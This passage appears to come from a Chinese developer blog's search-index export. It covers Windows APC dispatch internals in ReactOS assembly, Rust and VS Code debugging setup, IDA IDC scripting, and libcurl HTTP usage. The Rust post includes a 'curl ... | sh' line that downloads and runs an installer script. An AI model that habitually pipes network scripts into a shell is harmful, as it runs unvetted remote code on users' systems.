eax, [esp+CONTEXT_ALIGNED_SIZE+16];原始堆栈的位置，SEH mov ecx, fs:[TEB_EXCEPTION_LIST] mov edx, offset _KiUserApcExceptionHandler mov [eax], ecx mov [eax+4], edx /* Enable SEH */ mov fs:[TEB_EXCEPTION_LIST], eax /* Put the Context in EDI */ pop eax;弹出第一个参数 lea edi, [esp+12];context的位置 /* Call the APC Routine */ call eax //调用IntCallUserApc /* Restore exception list */ mov ecx, [edi+CONTEXT_ALIGNED_SIZE] mov fs:[TEB_EXCEPTION_LIST], ecx /* Switch back to the context */ push 1 push edi;Context call _ZwContinue@8 //正常是不会返回的 /* Save callback return value */ mov esi, eax /* Raise status */ StatusRaiseApc: push esi call _RtlRaiseStatus@4 //如果ZwContinue失败了，这里处理 jmp StatusRaiseApc ret 16.endfunc1234567`KiUserApcDispatcher`其实挺简单的，通过esp弹出APc函数，然后调用，就进入了IntCallUserApc，## 恢复TrapFrame执行完成后，调用_ZwContinue(Context, 1)，回到内核回复之前修改TrapFrame，也会重新检查是否有Apc需要投递，有则继续投递，重复上面的步骤，直到没有了则可以回到之前被中断的用户态的断点处。 .func NtContinue@8_NtContinue@8: /* NOTE: We -must- be called by Zw* to have the right frame! */ /* Push the stack frame */ push ebp ; 指向本次调用的自陷框架，记为T1 /* Get the current thread and restore its trap frame */ mov ebx, PCR[KPCR_CURRENT_THREAD] mov edx, [ebp+KTRAP_FRAME_EDX] mov [ebx+KTHREAD_TRAP_FRAME], edx;thread-&gt;TrapFrame = edx /* Set up stack frame */ mov ebp, esp ; ESP指向新的框架（函数调用框架） /* Save the parameters */ mov eax, [ebp+0] ; 原来的EBP，就是自陷框架指针，就是T1 mov ecx, [ebp+8] ; Context /* Call KiContinue */ push eax ;TrapFrame push 0 ;ExceptionFrame push ecx ;Context call _KiContinue@12 ; 将Context恢复到T1中 /* Check if we failed (bad context record) */ or eax, eax jnz Error /* Check if test alert was requested */ cmp dword ptr [ebp+12], 0 je DontTest /* Test alert for the thread */ mov al, [ebx+KTHREAD_PREVIOUS_MODE] push eax call _KeTestAlertThread@4 ; 检查用户模式APC队列是否为空，不空将UserApcPending置为TRUE DontTest: / Return to previous context / pop ebp mov esp, ebp jmp _KiServiceExit2 ; 本质和_KiServiceExit相同，如果还有用户APC，会继续投递，直到投递完，才会回到用户被中断的点 Error: pop ebp mov esp, ebp jmp _KiServiceExit.endfunc ``` 下面将_KiServiceExit到IntCallUserApc的流程总结一下： 到这里，终于执行到了用户的Apc函数。 结账走人到这，APC流程基本弄清楚了。 下一篇将结合APC机制分析一下最近比较新的AtomBombing注入技术的详细实现和各个细节。 参考 Reactos内核情景源码分析 线程的Alertable与User APC 转载请注明出处，博客原文：http://anhkgg.github.io/win-apc-analyze1/","tags":[{"name":"windows","slug":"windows","permalink":"https://anhkgg.github.io/tags/windows/"},{"name":"APC","slug":"APC","permalink":"https://anhkgg.github.io/tags/APC/"}]},{"title":"Rust笔记（一）-- 环境配置","date":"2017-04-25T14:03:33.000Z","path":"rust-note-1-config-environment/","text":"安装rustRust中文站下载rusthttps://www.rust-lang.org/zh-CN/install.htmlhttps://www.rust-lang.org/zh-CN/downloads.html 安装： Windows平台下载https://static.rust-lang.org/dist/rust-1.13.0-x86_64-pc-windows-msvc.msi，然后双击运行即可，需要选上PATH环境变量配置 其实应该下载这个版本https://static.rust-lang.org/dist/rust-nightly-x86_64-pc-windows-gnu.msi，后面会说为什么 Linux平台1234//安装 $ curl -sf -L https://static.rust-lang.org/rustup.sh | sh//卸载 $ sudo /usr/local/lib/rustlib/uninstall.sh 下面命令成功表示安装成功 1234c:\\&gt; rustc --versionrustc 1.13.0 (2c6933acc 2016-11-07)C:\\&gt; cargo --versioncargo 0.13.0-nightly (eca9e15 2016-11-01) 配置IDE这里介绍的是微软的Visual Studio Code编辑器配置Rust的环境。 Visual Studio Code支持windows、linux、mac等，所以在不同平台配置rust都是一样的步骤。 下载地址： https://code.visualstudio.com/ 启动visual studio code，ctrl+shift+x切换到插件安装页面，输入rust。 选择安装Rusty Code插件，支持自动完成、跳转到定义、符号等等功能。安装完成后，重新加载即可启用。 新建一个rs文件，visual studio code自动识别为rust语言。右下角有个Rust tool missing，点击后会提示插件缺少的库，选择安装即可（需要保证rust环境安装成功） 会出现：12345678910111213141516171819Executing &quot;cargo install racer&quot; Updating registry `https://github.com/rust-lang/crates.io-index` ··· Finished release [optimized + debuginfo] target(s) in 335.15 secs Installing C:\\Users\\xxx\\.cargo\\bin\\racer.exewarning: be sure to add `C:\\Users\\xxx\\.cargo\\bin` to your PATH to be able to run the installed binariesExecuting &quot;cargo install rustfmt&quot; Updating registry `https://github.com/rust-lang/crates.io-index` ··· Finished release [optimized] target(s) in 270.41 secs Installing C:\\Users\\xxx\\.cargo\\bin\\cargo-fmt.exe Installing C:\\Users\\xxx\\.cargo\\bin\\rustfmt.exewarning: be sure to add `C:\\Users\\xxx\\.cargo\\bin` to your PATH to be able to run the installed binariesExecuting &quot;cargo install rustsym&quot; Updating registry `https://github.com/rust-lang/crates.io-index` ··· Finished release [optimized] target(s) in 203.64 secs Installing C:\\Users\\xxx\\.cargo\\bin\\rustsym.exewarning: be sure to add `C:\\Users\\xxx\\.cargo\\bin` to your PATH to be able to run the installed binaries 安装完成后即可。测试一下，ok。 编译直接rustc xxx.rs编译程序，会出现缺少linker.exe（选择gnu版是不会出现这个错误，应该是不依赖msvc编译环境）123error: could not exec the linker `link.exe`: 系统找不到指定的文件。 (os error 2) | = note: &quot;link.exe&quot; 因为在Windows平台，rust编译程序需要vs c++编译工具，可以安装vs2013或者更高版本工具，更简单的方式就是下载Microsoft Visual C++ Build Tools 2015 Windows considerations On Windows, Rust additionally requires the C++ build tools for Visual Studio 2013 or later. The easiest way to acquire the build tools is by installing Microsoft Visual C++ Build Tools 2015 which provides just the Visual C++ build tools. Alternately, you can install Visual Studio 2015 or Visual Studio 2013 and during install select the “C++ tools”. For further information about configuring Rust on Windows see the Windows-specific rustup documentation. 安装完之后，重新编译成功。（编译不需要重启，但是后面调试中需要重启，否则调试器异常）12Compiling hello_world v0.1.0 (file:///xxx/rust/hello_world) Finished debug [unoptimized + debuginfo] target(s) in 0.28 secs 生成目录1234567891011121314151617D:\\xxx\\hello_world&gt;dir 驱动器 D 中的卷没有标签。 卷的序列号是 309A-078B D:\\xxx\\hello_world 的目录2016/12/19 11:21 &lt;DIR&gt; .2016/12/19 11:21 &lt;DIR&gt; ..2016/12/19 10:59 7 .gitignore2016/12/19 11:00 47 Cargo.lock2016/12/19 10:59 89 Cargo.toml2016/12/19 11:21 103,424 main.exe2016/12/19 11:21 487,424 main.pdb2016/12/19 10:59 &lt;DIR&gt; src2016/12/19 11:00 &lt;DIR&gt; target 5 个文件 590,991 字节 4 个目录 58,963,050,496 可用字节 在Visual Studio Code直接输入命令编译 ctrl+`，打开集成终端窗口 输入rust的编译命令即可 调试Rust目前支持使用LLDB和GDB调试，在Visual Studio Code可以安装lldb调试插件。 但是目前lldb不支持windows平台，只能在linux平台配置lldb，配置步骤如下： 依然ctrl+shift+x，然后输入rust，在列表中选择LLDB Debugger安装即可 安装之后，重新加载窗口，调试插件生效。打开之前的rs文件（vs code需要打开其目录作为工程目录），切换到调试窗口，点击调试开始按钮，会打开launch.json配置文件 123456789101112&#123; &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ &#123; &quot;name&quot;: &quot;Debug&quot;, &quot;type&quot;: &quot;lldb&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;$&#123;workspaceRoot&#125;/xxx&quot;, //main &quot;args&quot;: [] &#125; ]&#125; 将program中xxx配置为编译后的文件名就可以进行调试了。 在windows平台，需要使用gdb进行调试使用TDM-GCC的GDB（需要支持Python扩展，MinGW64的GDB貌似不支持） 下载TDM-GCC-gdb, 不需要安装，解压后，拷贝bin、gdb64、share目录到rust安装目录，修改gdb64\\bin目录中gdbinit内容，文件末尾加上 123456789pythonprint &quot;---- Loading Rust pretty-printers ----&quot; sys.path.insert(0, &quot;你的rust安装目录/lib/rustlib/etc&quot;) import gdb_rust_pretty_printing gdb_rust_pretty_printing.register_printers(gdb) end 下载rust源码, https://github.com/rust-lang/rust，拷贝etc目录到x\\rust\\lib\\rustlib目录 测试gdb是否安装成功 12345C:\\&gt;gdbGNU gdb (GDB) 7.9.1Copyright (C) 2015 Free Software Foundation, Inc....---- Loading Rust pretty-printers ---- 在Visual Studio Code中搜搜安装native debug插件（不止支持gdb），重新加载后，打开rs文件目录，切换到调试页面，点击调试按钮，弹出调试器列表，选择gdb，然后配置好launch.json文件（同lldb），保存即可开始调试 123456789101112&#123; &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ &#123; &quot;name&quot;: &quot;Debug&quot;, &quot;type&quot;: &quot;gdb&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;target&quot;: &quot;./target/debug/hello_world.exe&quot;, &quot;cwd&quot;: &quot;$&#123;workspaceRoot&#125;&quot; &#125; ]&#125; 问题 在调试中遇到问题12---- Loading Rust pretty-printers ----No symbol table is loaded. Use the &quot;file&quot; command. 经过一番周折发现是racer\\rustfmt\\rustsym没有安装成功，符号相关的是rustsym，安装完成之后，依然无法识别符号，各种翻找资料，无果。 最后在一篇英文博客中看到别人下载的rust版本是rust-nightly-x86_64-pc-windows-gnu.msi，突然想是不是跟版本有关，因为我下载的是msvc版，编译结果符号应该也是ms的，而调试其是gdb，是不是这样就识别不了了呢，而gnu版rust正好和gdb配套（猜测），所以应该会ok。 果不其然，重新下载了https://static.rust-lang.org/dist/rust-nightly-x86_64-pc-windows-gnu.msi，配置之后，可以正常识别符号了。 效果图： gnu版的rust在配置gdb时，不用下载rust源码添加etc目录的文件 Visual Studio Code左下角出现racer crashed，点击之后看到123Racer Output: RUST_SRC_PATH environment variable must be set to point to the src directory of a rust checkout. E.g. &quot;/home/foouser/src/rust/src&quot;Racer Error: 是因为安装racer步骤不完整，需要将rust源码中src拷贝到rust安装目录中，然后设置环境变量RUST_SRC_PATH = rust安装目录\\src验证racer是否成功：123456789c:\\&gt;racer complete std::io::BMATCH BufReader,50,11,C:\\Program Files\\Rust stable MSVC 1.13\\src\\libstd\\io\\buffered.rs,Struct,pub struct BufReader&lt;R&gt;MATCH BufWriter,309,11,C:\\Program Files\\Rust stable MSVC 1.13\\src\\libstd\\io\\buffered.rs,Struct,pub struct BufWriter&lt;W: Write&gt;MATCH BufRead,1208,10,C:\\Program Files\\Rust stable MSVC 1.13\\src\\libstd\\io\\mod.rs,Trait,pub trait BufRead: ReadMATCH Bytes,1605,11,C:\\Program Files\\Rust stable MSVC 1.13\\src\\libstd\\io\\mod.rs,Struct,pub struct Bytes&lt;R&gt;MATCH BufReader,50,11,.\\libstd\\io\\buffered.rs,Struct,pub struct BufReader&lt;R&gt;MATCH BufWriter,309,11,.\\libstd\\io\\buffered.rs,Struct,pub struct BufWriter&lt;W: Write&gt;MATCH BufRead,1208,10,.\\libstd\\io\\mod.rs,Trait,pub trait BufRead: ReadMATCH Bytes,1605,11,.\\libstd\\io\\mod.rs,Struct,pub struct Bytes&lt;R&gt; 在用户设置中配置如下参数：（如果已经将rust\\bin和.cargo\\bin加入PATH，并且设置好了RUST_SRC_PATH的话，这一步可以省略）{“rust.racerPath”: null, // Specifies path to Racer binary if it’s not in PATH“rust.rustLangSrcPath”: null, // Specifies path to /src directory of local copy of Rust sources“rust.rustfmtPath”: null, // Specifies path to Rustfmt binary if it’s not in PATH“rust.cargoPath”: null, // Specifies path to Cargo binary if it’s not in PATH“rust.cargoHomePath”: null, // Path to Cargo home directory, mostly needed for racer. Needed only if using custom rust installation.“rust.formatOnSave”: false, // Turn on/off autoformatting file on save (EXPERIMENTAL)“rust.checkOnSave”: false, // Turn on/off cargo check project on save (EXPERIMENTAL)“rust.checkWith”: “build” // Specifies the linter to use. (EXPERIMENTAL)} 参考 https://m.douban.com/group/topic/89086749/ https://www.douban.com/group/topic/63968269/ https://sherryummen.in/2016/09/02/debugging-rust-on-windows-using-visual-studio-code/ 转载请注明出处，博客原文：http://anhkgg.github.io/rust-note-1-config-environment/","tags":[{"name":"rust","slug":"rust","permalink":"https://anhkgg.github.io/tags/rust/"},{"name":"linux","slug":"linux","permalink":"https://anhkgg.github.io/tags/linux/"}]},{"title":"IDC脚本小试笔记","date":"2016-10-10T07:56:17.000Z","path":"idc-base-usage-test-note/","text":"概述IDC是IDA扩展的一种脚本语言，用于自动化，或者扩展查询IDA数据库 可以使用IDC或者python编写 语法类似C、也应用了C++类似的对象特性和异常处理 可以是单独的IDC文件，通过File-&gt;Script File加载，也可以是简单的IDC命令，通过File-&gt;Script Command来编写 变量包括字符串、整形、浮点型，后来又增加了对象、引用、函数指针等变量类型。 字符串是IDC的本地数据类型。 变量通过auto声明，在使用前都需要声明，没有知名明确的变量类型。 12auto addr, reg, val; /*xxxx*/auto count = 0; // xxx 注释使用//或者/**/，语句使用；作为结束 不支持C风格数组（使用分片）、指针（使用引用）、结构体和联合体之类的复杂数据结构，之后引入了类的概念。 extern引入全局变量声明，不能声明中初始化值，可以在任何函数内外声明。 1234567extern outglobal;static mian()&#123; extern inglobal; outglobal = &quot;xx&quot;; inglobal = 1;&#125; 表达式支持几乎所有的C算术和逻辑运算符，除了几个特例外（？？）。包括三元运算？：，不支持op=(+=，*=， &gt;&gt;=)等复合运算符。后来可以支持逗号运算， 所有整数操作都是有符号的值处理。所以在整数比较和右移运算（&gt;&gt;）收到影响。 如果需要逻辑右移位，必须自己修改结果的最高位。1result = (x &gt;&gt; 1)&amp;0x7fffffff; 字符串操作、分片（语法类似python字符串操作）123456auto str = &quot;string to slice&quot;;auto s1, s2, s3, s4;s1 = str[7:9];s2 = str[:6];s3 = str[10:];s4 = str[5]; IDC语句唯一不支持C中的switch语句12auto i;for(i = 0; i&lt;10; i = i+1) &#123;&#125; 可以在花括号开始声明变量，但是变量没有具体作用域，可以在外面使用。但是函数中不能使用其他函数内部声明的变量。 1234if(1) &#123; auto x; x = 10;&#125;Message(&quot;x = %d\\n&quot;, x); IDC函数只有独立IDC文件才支持函数，IDC命令框不支持函数。 使用static引入一个函数定义。函数参数只有参数名列表，逗号分隔。1234static test(x, y, z) &#123; auto a, b, c;&#125; IDA5.6之前，函数参数严格使用传值传递，之后引入了传地址参数传递机制。采用哪种方式传递参数，使用调用者来决定的，而不是函数声明决定的。传地址方式在调用方参数前加入&amp;。123auto q=1, r=0, s=2;test(q,r, s);test(q, &amp;r, s);// 函数声明不会指明要返回一个值，以及返回什么类型的值。 如果需要返回值，使用return返回指定的值即可。 可以在不同的路径返回不同类型的值。任何不显示返回值的函数默认返回为0. IDA5.6之后，函数离成为IDC中第一类对象更近了一布，函数引用可以作为参数传给另一个函数，也可以将函数引用作为函数返回值。 12345678910static ret() &#123; return Message;&#125;staic call(fun, arg) &#123; fun(arg);&#125;static main() &#123; auto f = ret(); call(f, &quot;Message Call&quot;);&#125; IDC对象1234567891011121314151617class People&#123; People(name, age) &#123; this.name = name; this.age = age; &#125; ~People() &#123; &#125; print() &#123; Message(&quot;name: %s, age: %d&quot;, this.name, this.age); &#125;&#125;static main() &#123; People p;//error auto p = People(&quot;john&quot;, 12); p.print();&#125; 常用函数123456789101112131415161718192021222324252627282930313233343536//Array操作class MyArray&#123; MyArray(name) &#123; this.name = name; this.id = CreateArray(name); if(this.id == -1) &#123; this.id = GetArrayId(name); &#125; &#125; ~MyArray() &#123; if(this.id != -1) &#123; DeleteArray(this.id); &#125; &#125; SetArrayData(tag, idx, val) &#123; if(tag == AR_LONG) &#123; SetArrayLong(this.id, idx, val); &#125; else if(tag == AR_STR) &#123; SetArrayString(this.id, idx, val); &#125;else &#123; return 0; &#125; return 1; &#125; GetArrayData(tag, idx) &#123; return GetArrayElement(tag, this.id, idx); &#125; DelArrayData(tag, idx) &#123; return DelArrayElement(tag, this.id, idx); &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173auto val;val = Byte(0x00EEEC1A);Message(&quot;val = %08x \\n&quot;, val);print(&quot;xxxxxxxxxxxxxxxxxxxxxxxxxx&quot;);//Warning(&quot;val = %08x\\n&quot;, val);//交互val = AskStr(&quot;124&quot;, &quot;enter a val&quot;); //AskFile, AskYNif(val == 0) &#123; print(&quot;no enter val&quot;);&#125;else &#123; Message(&quot;val = %08x \\n&quot;, val);&#125;Jump(0x400000);Message(&quot;cursor = %08x\\n&quot;, ScreenEA());//字符串操作//val= 0000302dval = sprintf(&quot;%08x&quot;, 12333);//formMessage(&quot;val = %s \\n&quot;, val);////val = 0000302d 12333Message(&quot;val = %08x %d\\n&quot;, xtol(val), xtol(val));//atol xtol Message(&quot;A = %d %02x\\n&quot;, ord(&quot;A&quot;), ord(&quot;A&quot;)); //A = 65 41Message(&quot;val size = %d\\n&quot;, strlen(val));//strstr, substr, str[s:e]//文件操作class MyFile&#123; MyFile(name, mode) &#123; this.h = fopen(name, mode); if(this.h == 0) &#123; //error &#125; &#125; ~MyFile() &#123; if(this.h != 0) &#123; fclose(this.h); &#125; &#125; length() &#123; return filelength(this.h); &#125; _fgetc() &#123; return fgetc(this.h); &#125; _fputc(val) &#123; return fputs(val, this.h); &#125; //_fprintf(format, ...) &#123; //return fprintf(this.h, format, ...); //&#125; _writestr(str) &#123; return writestr(this.h, str); &#125; _readstr() &#123; return readstr(this.h);//-1=end &#125; _writelongb(val) &#123; return writelong(this.h, val, 1);//大端 &#125; _writelongs(val) &#123; return writelong(this.h, val, 0);//小端 &#125; _readlongb() &#123; return readlong(this.h, 1); &#125; _readlongs() &#123; return readlong(this.h, 0); &#125; _writeshortb(val) &#123; return writeshort(this.h, val, 1); &#125; _writeshorts(val) &#123; return writeshort(this.h, val, 0); &#125; _readshortb() &#123; return readshort(this.h, 1); &#125; _readshorts() &#123; return readshort(this.h, 0); &#125; _loadfile(pos, addr, length) &#123; return loadfile(this.h, pos, addr, length); &#125; _savefile(pos, addr, length) &#123; return savefile(this.h, pos, addr, length); &#125;&#125;//fileauto fn = AskFile(1, &quot;*.txt&quot;, &quot;save file&quot;);//1=save, 0=openMessage(&quot;save file = %s\\n&quot;, fn);auto mf = MyFile(fn, &apos;w&apos;);//mf._writelongb(122222);//mf._writestr(&quot;test file write data&quot;);//writestr(mf.h, &quot;test file write data&quot;);//mf._savefile(0, 0x400000, 50);Message(&quot;file data = %s&quot;, mf._readstr());//Message(&quot;file data = %s&quot;, mf._readlongb());//name, addressMessage(&quot;%08x, %s\\n&quot;, 0x400016, Name(0x400016));//Message(&quot;xxx = %s\\n&quot;, NameEx(0x0040BD14, 0x0040BD1C));MakeNameEx(0x0040BD1C, &quot;testxxxx&quot;, 1);Message(&quot;xxx = %08x\\n&quot;, LocByName(&quot;testxxxx&quot;));Message(&quot;xxx = %08x\\n&quot;, LocByNameEx(0x0040BD14, &quot;testxxxx&quot;));//functionMessage(&quot;end = %08x, start = %08x\\n&quot;, GetFunctionAttr(0x0040BD14, FUNCATTR_END), GetFunctionAttr(0x0040BD14, FUNCATTR_START));Message(&quot;f = %s\\n&quot;, GetFunctionName(0x0040BD1C));Message(&quot;f_next = %08x\\n&quot;, NextFunction(0x0040BD1C));Message(&quot;f_prev = %08x\\n&quot;, PrevFunction(0x0040BD1C));//代码xrefauto cur = Rfirst(0x0040BD1C);//跳到哪里去，第一个Message(&quot;to = %08x\\n&quot;, cur);Message(&quot;to = %08x\\n&quot;, Rnext(0x0040BD1C, cur));//跳到哪里去，下一个Message(&quot;to = %08x\\n&quot;, XrefType());//fl_CN, fl_CF, fl_JN, fl_JF, fl_Fcur = RfirstB(0x40B928);//什么地方跳来的，第一个Message(&quot;from = %08x\\n&quot;, cur );Message(&quot;from = %08x\\n&quot;, RnextB(0x40B928, cur));//什么地方跳来的，下一个//数据xrefcur = Dfirst(0x01410559);//改地址引用的第一个数据的地址Message(&quot;to d = %08x\\n&quot;, cur);Message(&quot;to d = %08x\\n&quot;, Dnext(0x01410559, cur));Message(&quot;to = %08x\\n&quot;, XrefType());//dr_O偏移量, dr_W数据写入, dr_R数据读取cur = DfirstB(0x01411EF0);//引用该数据的第一个地址Message(&quot;from d = %08x\\n&quot;, cur);Message(&quot;from d = %08x\\n&quot;, DnextB(0x01411EF0, cur));//引用该数据的下一个地址//databaseMakeUnkn(0x0043DC57, DOUNK_SIMPLE);//undefineMakeCode(0x0043DC57);//转为code//MakeUnkn(0x0043DC57, DOUNK_SIMPLE);//undefine//MakeUnkn(0x0043DC58, DOUNK_SIMPLE);////MakeWord(0x0043DC57);//转为数据 MakeWord, MakeDwordMakeComm(0x0043DC57, &quot;just for test comment&quot;);////MakeFunction(s, e);////MakeStr(s, e);////search SEARCH_DOWN, SEARCH_NEXT, SEARCH_CASEMessage(&quot;code = %08x\\n&quot;, FindCode(0x400000, 1));//从这开始搜索一条指令Message(&quot;data = %08x\\n&quot;, FindData(0x400000, 1));//从这开始搜索一个数据//Message(&quot;find = %08x\\n&quot;, FindBinary(0x400000, 1, &quot;FFAB3740&quot;));//从这开始搜索hex数据auto row = 0;auto column = 0;//Message(&quot;find = %08x\\n&quot;, FindText(0x400000, 1, row, column, &quot;http://&quot;));//asmMessage(&quot;asm = %s\\n&quot;, GetDisasm(0x0043D7D8));//asm = push ebp ; xxxxxxxxxxxxxxxxMessage(&quot;asm = %s\\n&quot;, GetMnem(0x0043D7D8));//asm = pushMessage(&quot;asm = %s\\n&quot;, GetOpnd(0x0043D7D8, 0));//asm = ebpMessage(&quot;asm = %d\\n&quot;, GetOpType(0x0043D7D8, 0));//asm = 1Message(&quot;asm = %08x\\n&quot;, GetOperandValue(0x0043D7D8, 0));//asm = 00000005Message(&quot;asm = %s\\n&quot;, CommentEx(0x0043D7D8, 0));//asm = xxxxxxxxxxxxxxxx 总结总的来说，idc语法真的挺简单的，跟c基本一样，写起来不需要多大力气，就是需要熟悉idc提供的各类功能函数，应用起来才能得心应手。","tags":[{"name":"reverse","slug":"reverse","permalink":"https://anhkgg.github.io/tags/reverse/"},{"name":"IDAPro","slug":"IDAPro","permalink":"https://anhkgg.github.io/tags/IDAPro/"},{"name":"IDC","slug":"IDC","permalink":"https://anhkgg.github.io/tags/IDC/"}]},{"title":"libcurl小记-简单http封装使用-源码分析","date":"2016-08-25T12:32:06.000Z","path":"liburl-use-minihttp/","text":"0x00. 前面以前用Wininet api包了一个简单易用的http请求的lib，但是居然会遇到系统不支持的情况，难道要我自己用socket写吗？no way！ 以前知道liburl，第一次使用，啥都不知道，反正感觉挺强大的 &lt; libcurl is a free and easy-to-use client-side URL transfer library, supporting DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, Telnet and TFTP. 须知，我这里只用到了HTTP home: https://curl.haxx.se/ document: https://curl.haxx.se/libcurl/ 其实使用比较简单，但对我没有认真看过文档，并且没有找到好资料的情况下，我遇到了很多弯路，并且想吐槽实例代码，搞那么复杂干嘛，还没有我想要的代码。 下面开始坑。 0x01. 就这么简单1234567891011121314151617181920212223242526272829303132333435/* curl stuff */ #include &lt;curl/curl.h&gt;//#pragma comment(lib, &quot;liburl.lib&quot;)int main(void)&#123; CURL *curl; CURLcode res; /* In windows, this will init the winsock stuff */ curl_global_init(CURL_GLOBAL_ALL); /* get a curl handle */ curl = curl_easy_init(); if(curl) &#123; /* First set the URL that is about to receive our POST. This URL can just as well be a https:// URL if that is what should receive the data. */ curl_easy_setopt(curl, CURLOPT_URL, &quot;http://postit.example.com/moo.cgi&quot;); /* Now specify the POST data */ curl_easy_setopt(curl, CURLOPT_POSTFIELDS, &quot;name=daniel&amp;project=curl&quot;); /* Perform the request, res will get the return code */ res = curl_easy_perform(curl); /* Check for errors */ if(res != CURLE_OK) fprintf(stderr, &quot;curl_easy_perform() failed: %s\\n&quot;, curl_easy_strerror(res)); /* always cleanup */ curl_easy_cleanup(curl); &#125; curl_global_cleanup(); return 0;&#125; 简单应用就是这样子，关键在这两句123curl_easy_setopt(curl, CURLOPT_URL, &quot;http://postit.example.com/moo.cgi&quot;); /* Now specify the POST data */ curl_easy_setopt(curl, CURLOPT_POSTFIELDS, &quot;name=daniel&amp;project=curl&quot;); liburl通过设置各种回调函数来完成各种功能。 0x02. http请求CURLOPT_URL ： 访问的目标url路径，如果是GET方式请求，需要将请求数据加到URL后面 1www.baidu.com/login.asp?name=111&amp;password=111 CURLOPT_POSTFIELDS ： POST请求中发送的数据 1curl_easy_setopt(curl, CURLOPT_POSTFIELDS, &quot;name=daniel&amp;project=curl&quot;); 并且POST请求中还需要设置CURLOPT_POST为1 123/* size of the POST data */curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.length());curl_easy_setopt(curl, CURLOPT_POST, 1); 另外，奇葩的1curl_easy_setopt(curl, CURLOPT_URL, url.c_str()); //url在release可正常使用，debug去不行，只能使用url.c_str(); 0x03. 接收数据接收数据需要注册CURLOPT_WRITEFUNCTION回调函数，在回调函数中进行数据处理 1curl_easy_setopt(*curl, CURLOPT_WRITEFUNCTION, write_callback); 如果数据不能一次接收完成，需要利用回调中的参数来缓存数据，也就是通过CURLOPT_WRITEDATA设置 1curl_easy_setopt(*curl, CURLOPT_WRITEDATA, data); 回调函数处理中，最后一次参数就是设置的用于缓存的变量，需要注意的是数据长度，不是size，而是size*nmemb。 并且如果返回值不等于size*nmemb，libcurl会认为处理失败 12345678910size_t write_callback(char *ptr, size_t size, size_t nmemb, void *userdata)&#123; size_t all_size = size*nmemb; PWRITE_CALLBACK_DATA data = (PWRITE_CALLBACK_DATA)userdata; data-&gt;data.append(ptr); data-&gt;size += all_size; return all_size;&#125; 0x04. cookie通过cookie文件保存，读取cookie 12curl_easy_setopt(*curl, CURLOPT_COOKIEJAR, &quot;cookie.txt&quot;); //把服务器发过来的cookie保存到cookie.txtcurl_easy_setopt(*curl, CURLOPT_COOKIEFILE, &quot;cookie.txt&quot;); //读取本地存储的cookie 直接设置cookie信息 1//curl_easy_setopt(curl, CURLOPT_COOKIE, m_cookies.c_str()); 0x05. 一点点分析下面是遇到坑时的一小点点源码翻阅，觉得有用的可以看看 1. curl_easy_setopt调用中123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//curl_easy_setopt调用中CURLcode curl_easy_setopt(struct Curl_easy *data, CURLoption tag, ...)//lib/easy.c--&gt;CURLcode Curl_setopt(struct Curl_easy *data, CURLoption option, va_list param)//lib/url.c&#123; //根据option类型，设置不同回调 //保存在data-&gt;set的不同字段中 case CURLOPT_URL: if(data-&gt;change.url_alloc) &#123; /* the already set URL is allocated, free it first! */ Curl_safefree(data-&gt;change.url); data-&gt;change.url_alloc = FALSE; &#125; result = setstropt(&amp;data-&gt;set.str[STRING_SET_URL], va_arg(param, char *)); data-&gt;change.url = data-&gt;set.str[STRING_SET_URL]; break; case CURLOPT_PORT: data-&gt;set.use_port = va_arg(param, long); break; case CURLOPT_WRITEFUNCTION: data-&gt;set.fwrite_func = va_arg(param, curl_write_callback); if(!data-&gt;set.fwrite_func) &#123; data-&gt;set.is_fwrite_set = 0; /* When set to NULL, reset to our internal default function */ data-&gt;set.fwrite_func = (curl_write_callback)fwrite; &#125; else data-&gt;set.is_fwrite_set = 1; break; case CURLOPT_WRITEDATA: data-&gt;set.out = va_arg(param, void *); break; case CURLOPT_HTTPHEADER: data-&gt;set.headers = va_arg(param, struct curl_slist *); break; case CURLOPT_COOKIEJAR: &#123; struct CookieInfo *newcookies; result = setstropt(&amp;data-&gt;set.str[STRING_COOKIEJAR], va_arg(param, char *)); newcookies = Curl_cookie_init(data, NULL, data-&gt;cookies, data-&gt;set.cookiesession); if(!newcookies) result = CURLE_OUT_OF_MEMORY; data-&gt;cookies = newcookies; &#125; break;&#125; 2. 请求中123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189CURLcode curl_easy_perform(struct Curl_easy *data)//lib/easy.c-&gt;static CURLcode easy_perform(struct Curl_easy *data, bool events)//lib/easy.c-&gt;static CURLcode easy_transfer(struct Curl_multi *multi)//lib/easy.c-&gt;CURLMcode curl_multi_perform(struct Curl_multi *multi, int *running_handles)//\\lib\\multi.c&#123; data=multi-&gt;easyp;//就是Curl_easy *data while(data) &#123; CURLMcode result; SIGPIPE_VARIABLE(pipe_st); sigpipe_ignore(data, &amp;pipe_st); result = multi_runsingle(multi, now, data);//一次请求 sigpipe_restore(&amp;pipe_st); if(result) returncode = result; data = data-&gt;next; /* operate on next handle */ &#125;&#125;-&gt;static CURLMcode multi_runsingle(struct Curl_multi *multi, struct timeval now, struct Curl_easy *data)//\\lib\\multi.c&#123; //这里面有个重要的字段data-&gt;mstate，表示当前curl的状态 //通过multistate(data, CURLM_STATE_PERFORM);=&gt;static void mstate(struct Curl_easy *data, CURLMstate state)赋值 //CURLMcode curl_multi_add_handle(struct Curl_multi *multi, struct Curl_easy *data) =&gt; multistate(data, CURLM_STATE_INIT); //CURLMcode Curl_multi_add_perform(struct Curl_multi *multi, struct Curl_easy *data, struct connectdata *conn)=&gt;multistate(data, CURLM_STATE_PERFORM); //等等 //... do&#123; //本函数中，循环各种状态判断，处理不同逻辑 switch(data-&gt;mstate) &#123; //初始化 case 